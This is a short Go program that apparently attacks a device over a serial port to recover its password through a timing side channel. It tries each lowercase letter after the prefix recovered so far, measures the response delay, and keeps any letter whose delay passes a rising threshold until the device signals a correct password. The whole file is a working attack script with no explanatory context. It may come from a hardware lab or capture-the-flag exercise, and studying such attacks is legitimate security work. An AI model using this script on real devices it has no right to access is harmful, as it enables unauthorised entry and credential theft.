package main

import (
	"fmt"
	"github.com/tarm/serial"
	"log"
	"os"
	"time"
)

func main() {
	log.SetFlags(log.LstdFlags | log.Lmicroseconds)
	log.Printf("Starting")
	fmt.Printf(".\n")

	c := &serial.Config{Name: os.Args[1], Baud: 19200}
	s, err := serial.OpenPort(c)
	if err != nil {
		panic(err)
	}

	ch := make(chan byte)

	go read(s, ch)

	cr := []byte("\r")
	_, err = s.Write(cr)
	if err != nil {
		panic(err)
	}

	delta := 250 * time.Millisecond

	pw := ""
	chars := "abcdefghijklmnopqrstuvwxyz"

	log.Printf("Starting timing attacks")
	_, _ = s.Write(cr)

	for {
		for _, chr := range chars {
			log.Printf("Trying with: %s", string(chr))
			try := []byte(pw + string(chr) + "\r")
			t := time.Now()
			_, err = s.Write(try)
			<-ch
			d := time.Now().Sub(t)
			log.Printf("Delta: %v", d.Milliseconds())
			if d > delta {
				log.Printf("Got new char: %s", string(chr))
				pw = pw + string(chr)
				log.Printf("PW now: %s", pw)
				delta = d + (10 * time.Millisecond)
				break
			}
		}
	}

}

func read(s *serial.Port, c chan byte) {
	buf := make([]byte, 64)
	for {
		n, err := s.Read(buf)
		if err != nil {
			log.Printf("Serial read error: %v", err)
			close(c)
			os.Exit(1)
		}
		// fmt.Printf("%s", buf[:n])
		for _, b := range buf[:n] {
			if b == ':' {
				c <- 1
			} else if b == '[' {
				log.Printf("Correct PW!")
				fmt.Printf("%s\n", buf[:n])
				time.Sleep(5 * time.Second)
				os.Exit(0)
			}
		}
	}
}
